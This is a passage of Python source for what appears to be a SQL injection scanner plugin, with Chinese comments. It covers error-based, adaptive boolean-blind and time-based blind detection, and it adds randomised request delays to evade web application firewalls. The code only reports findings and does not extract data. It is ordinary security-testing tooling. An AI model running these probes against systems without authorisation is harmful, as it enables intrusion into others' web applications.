                len(baseline_matching_patterns),
            )

        for param_idx, param_name in enumerate(test_params):
            logger.debug(
                "[SQLi] 测试参数 [%d/%d]: %s → %s",
                param_idx + 1, len(test_params), url, param_name,
            )

            # ── Phase 2 + 3: 报错注入 (基础 + 变异 payload) ──
            # 每个 payload 都触发一次进度回调
            error_result = None
            for payload_idx, payload in enumerate(all_error_payloads):
                if waf_detected:
                    await asyncio.sleep(random.uniform(1.0, 3.0))

                injected_url = _inject_param(
                    url, param_name, payload, merged_background
                )

                is_mutated = payload_idx >= len(base_error_payloads)
                target_word = "指定参数" if target_param else "参数"
                label = (
                    f"正在对{target_word} [{param_name}] 测试第 "
                    f"{current_step + 1}/{total_steps} 个"
                    f"{'变异' if is_mutated else '基础'}Payload\n"
                    f"  ▸ {payload[:80]}{'…' if len(payload) > 80 else ''}"
                )
                current_step += 1
                self._fire_progress(progress_callback, current_step, total_steps, label)

                try:
                    resp = await requester.get(injected_url)
                    resp_text = resp.text
                    
                    found_in_this_payload = False
                    for sig in _DB_ERROR_SIGNATURES:
                        for pattern in sig.patterns:
                            if pattern in baseline_matching_patterns:
                                continue
                            if re.search(pattern, resp_text, re.IGNORECASE):
                                logger.warning("[SQLi/Error] %s → 匹配 %s", url, pattern)
                                context["detected_db_type"] = sig.db_type
                                error_res = {
                                    "type": "Error-Based",
                                    "param": param_name,
                                    "payload": payload,
                                    "db_type": sig.db_type,
                                    "evidence": f"Pattern Match: {pattern}",
                                    "confidence": 0.95,
                                }
                                findings.append(error_res)
                                attempts.append({"payload": payload, "type": "Error", "status": "Vulnerable", "info": sig.db_type})
                                found_in_this_payload = True
                                break
                        if found_in_this_payload:
                            break
                    
                    if not found_in_this_payload:
                        attempts.append({"payload": payload, "type": "Error", "status": "Safe"})
                except Exception as e:
                    attempts.append({"payload": payload, "type": "Error", "status": "Error", "info": str(e)})
                    continue

            # --- 报错注入结束 ---

            # ── Phase 4: 自适应布尔盲注 ──
            blind_hits = await self._test_boolean_blind(
                url, param_name, requester, baseline_fp, waf_detected, merged_background, attempts
            )
            for hit in blind_hits:
                findings.append(hit)
            
            # 进度补全
            current_step += boolean_count
            self._fire_progress(progress_callback, current_step, total_steps, f"参数 [{param_name}] 布尔盲注完成")

            # ── Phase 5: 时间盲注 ──
            time_hits = await self._test_time_blind(
                url, param_name, requester, network_baseline, merged_background, context, attempts
            )
            for hit in time_hits:
                findings.append(hit)
            
            current_step += time_count
            self._fire_progress(progress_callback, current_step, total_steps, f"参数 [{param_name}] 时间盲注完成")

        # 最终进度 100%
        self._fire_progress(
            progress_callback, total_steps, total_steps,
            "SQLi 扫描完成",
        )

        # 汇总
        if not findings:
            return self.result(url, is_vulnerable=False, extra={"attempts": attempts})

        # 取最高置信度的发现
        best = max(findings, key=lambda f: f.get("confidence", 0))
        all_vuln_params = list(set(f["param"] for f in findings))

        return self.result(
            url,
            is_vulnerable=True,
            detail=(
                f"发现 SQL 注入 | 类型: {best['type']} "
                f"| 数据库: {best.get('db_type', 'Unknown')} "
                f"| 参数: {', '.join(all_vuln_params)} "
                f"| 测试点: {len(test_params)} "
                f"| 背景参数: {len(merged_background)}"
            ),
            evidence=best.get("evidence", ""),
            extra={
                "findings": findings,
                "attempts": attempts,
                "vulnerable_params": all_vuln_params,
                "waf_detected": waf_detected,
                "injection_discovery": {
                    "test_params": test_params,
                    "background_params": list(merged_background.keys()),
                },
            },
        )

    # ─────────────────────────────────────────
    # Phase 4: 自适应布尔盲注 (Adaptive Boolean-Based Blind)
    # ─────────────────────────────────────────

    async def _test_boolean_blind(
        self,
        url: str,
        param: str,
        requester: AsyncRequester,
        baseline_fp: ResponseFingerprint,
        waf_mode: bool,
        business_params: Dict[str, str],
        attempts: List[Dict[str, Any]],
    ) -> List[Dict[str, Any]]:
        """
        自适应布尔盲注 — 使用响应指纹 + 相对差值模型
        """
        results = []
        baseline_hash = await asyncio.to_thread(SimHash, baseline_fp.stripped_text)

        for true_suffix, false_suffix in _BOOLEAN_PAYLOAD_PAIRS:
            if waf_mode:
                await asyncio.sleep(random.uniform(1.5, 4.0))

            true_url = _inject_param(url, param, true_suffix, business_params)
            false_url = _inject_param(url, param, false_suffix, business_params)

            try:
                true_resp = await requester.get(true_url)
                if waf_mode:
                    await asyncio.sleep(random.uniform(0.5, 2.0))
                false_resp = await requester.get(false_url)
            except Exception:
                continue

            # 构建响应指纹
            true_fp = ResponseFingerprint.from_response(true_resp)
            false_fp = ResponseFingerprint.from_response(false_resp)

            # ── 指纹相似度比对 ──
            sim_baseline_true, sim_baseline_false = await asyncio.gather(
                asyncio.to_thread(baseline_fp.similarity_to, true_fp),
                asyncio.to_thread(baseline_fp.similarity_to, false_fp)
            )
            diff_magnitude = sim_baseline_true - sim_baseline_false

            # ── SimHash 分析 ──
            def _compute_simhashes():
                th = SimHash(true_fp.stripped_text)
                fh = SimHash(false_fp.stripped_text)
                return baseline_hash.similarity(th), baseline_hash.similarity(fh)
            
            simhash_bt, simhash_bf = await asyncio.to_thread(_compute_simhashes)
            simhash_diff = simhash_bt - simhash_bf

            # ── 自适应判定 (相对差值模型) ──
            fingerprint_pass = diff_magnitude >= self.ADAPTIVE_DIFF_THRESHOLD
            simhash_pass = simhash_diff >= self.SIMHASH_DIFF_THRESHOLD

            # ── 记录探测尝试 (Evidence Matrix) ──
            attempts.append({
                "type": "Boolean-Blind",
                "param": param,
                "payload_true": true_suffix,
                "payload_false": false_suffix,
                "status_code_true": true_resp.status_code,
                "status_code_false": false_resp.status_code,
                "fingerprint_diff": diff_magnitude,
                "simhash_diff": simhash_diff,
                "status": "Suspicious" if (fingerprint_pass and simhash_pass) else "Safe"
            })

            # 双重验证通过 → 进入二次确认轮 (排除网络抖动)
            if fingerprint_pass and simhash_pass:
                # ── 二次确认: 用相同 payload 再发一轮请求 ──
                try:
                    confirm_true = await requester.get(true_url)
                    if waf_mode:
                        await asyncio.sleep(random.uniform(0.5, 2.0))
                    confirm_false = await requester.get(false_url)
                    confirm_true_fp = ResponseFingerprint.from_response(confirm_true)
                    confirm_false_fp = ResponseFingerprint.from_response(confirm_false)
                    confirm_sim_bt = await asyncio.to_thread(baseline_fp.similarity_to, confirm_true_fp)
                    confirm_sim_bf = await asyncio.to_thread(baseline_fp.similarity_to, confirm_false_fp)
                    confirm_diff = confirm_sim_bt - confirm_sim_bf
                    if confirm_diff < self.ADAPTIVE_DIFF_THRESHOLD:
                        logger.info(
                            "[SQLi/Blind] 二次确认未通过 (confirm_diff=%.4f < %.4f)，判定为网络抖动",
                            confirm_diff, self.ADAPTIVE_DIFF_THRESHOLD,
                        )
                        continue  # 不是真正的注入，继续下一个 payload
                except Exception:
                    continue  # 确认请求失败，保守跳过
                evidence = (
                    f"参数 [{param}] | 自适应布尔盲注确认\n"
                    f"  TRUE payload:  {true_suffix}\n"
                    f"  FALSE payload: {false_suffix}\n"
                    f"  Fingerprint: base↔true={sim_baseline_true:.4f} "
                    f"base↔false={sim_baseline_false:.4f} diff={diff_magnitude:.4f}\n"
                    f"  SimHash: base↔true={simhash_bt:.4f} "
                    f"base↔false={simhash_bf:.4f} diff={simhash_diff:.4f}"
                )
                logger.warning("[SQLi/Blind] %s → %s", url, evidence)

                results.append({
                    "type": "Boolean-Based Blind (Adaptive)",
                    "param": param,
                    "true_payload": true_suffix,
                    "false_payload": false_suffix,
                    "db_type": "Unknown",
                    "evidence": evidence,
                    "confidence": 0.85,
                    "metrics": {
                        "fingerprint": {
                            "base_true": sim_baseline_true,
                            "base_false": sim_baseline_false,
                            "diff": diff_magnitude,
                        },
                        "simhash": {
                            "base_true": simhash_bt,
                            "base_false": simhash_bf,
                            "diff": simhash_diff,
                        },
                    },
                })
                return results

            # 单项验证通过（降低置信度）
            if fingerprint_pass or simhash_pass:
                method = "Fingerprint" if fingerprint_pass else "SimHash"
                evidence = (
                    f"参数 [{param}] | 布尔盲注疑似 (仅 {method} 验证通过)\n"
                    f"  TRUE payload:  {true_suffix}\n"
                    f"  FALSE payload: {false_suffix}"
                )
                logger.info("[SQLi/Blind] %s → 疑似: %s", url, evidence)

                results.append({
                    "type": "Boolean-Based Blind (疑似)",
                    "param": param,
                    "true_payload": true_suffix,
                    "false_payload": false_suffix,
                    "db_type": "Unknown",
                    "evidence": evidence,
                    "confidence": 0.60,
                })
                return results

        return results

    # ─────────────────────────────────────────
    # Phase 5: 时间盲注 (Time-Based Blind)
    # ─────────────────────────────────────────

    async def _test_time_blind(
        self,
        url: str,
        param: str,
        requester: AsyncRequester,
        network_baseline: float,
        business_params: Dict[str, str],
        context: Dict[str, Any],
        attempts: List[Dict[str, Any]],
    ) -> List[Dict[str, Any]]:
        """
        时间盲注检测 — 带网络延迟校准

        算法:
            1. 从预采样获得的 network_baseline 作为基准延迟
            2. 发送 SLEEP(N) payload
            3. 计算 (实际耗时 - 基准延迟)
            4. 只有差值 >= SLEEP * TIME_TOLERANCE_RATIO (70%) 才判定
        """
        results = []
        db_key = context.get("detected_db_type", "unknown").lower()
        payloads = _TIME_BASED_PAYLOADS.get(db_key, _TIME_BASED_PAYLOADS["unknown"])

        for template, expected_delay in payloads:
            delay_val = int(expected_delay)
            payload = template.format(delay=delay_val)
            injected_url = _inject_param(url, param, payload, business_params)

            try:
                t0 = _time.monotonic()
                await requester.get(injected_url)
                elapsed = _time.monotonic() - t0
                actual_delay = elapsed - network_baseline
                threshold = expected_delay * self.TIME_TOLERANCE_RATIO

                if actual_delay >= threshold:
                    # 反向验证: SLEEP(0)
                    zero_payload = template.format(delay=0)
                    zero_url = _inject_param(url, param, zero_payload, business_params)
                    t0_z = _time.monotonic()
                    await requester.get(zero_url)
                    zero_elapsed = _time.monotonic() - t0_z
                    
                    if (zero_elapsed - network_baseline) < threshold * 0.5:
                        results.append({
                            "type": "Time-Based Blind",
                            "param": param,
                            "payload": payload,
                            "confidence": 0.90,
                            "evidence": f"Actual Delay: {actual_delay:.3f}s (Threshold: {threshold:.3f}s)"
                        })
                        attempts.append({"payload": payload, "type": "Time", "status": "Vulnerable", "elapsed": actual_delay, "threshold": threshold})
                    else:
                        attempts.append({"payload": payload, "type": "Time", "status": "Safe", "elapsed": actual_delay, "info": f"Reverse Fail: {zero_elapsed - network_baseline:.2f}s"})
                else:
                    attempts.append({"payload": payload, "type": "Time", "status": "Safe", "elapsed": actual_delay, "threshold": threshold})
            except Exception as e:
                attempts.append({"payload": payload, "type": "Time", "status": "Error", "info": str(e)})
                continue

        return results

    # ─────────────────────────────────────────
    # WAF 联动
    # ─────────────────────────────────────────

    def _check_waf_status(
        self, url: str, context: Dict[str, Any]
    ) -> bool:
        """
        从共享上下文中读取 WAF 检测结果

        WAF 数据由 waf_check 插件写入:
          context["waf"][url] = {"detected": True, "waf_list": [...]}
        """
        waf_data = context.get("waf", {})

        # 精确匹配
        if url in waf_data:
            return waf_data[url].get("detected", False)

        # 域名级匹配（waf_check 可能扫描的是根 URL）
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for checked_url, info in waf_data.items():
            if checked_url.startswith(base_url) and info.get("detected", False):
                return True

        return False
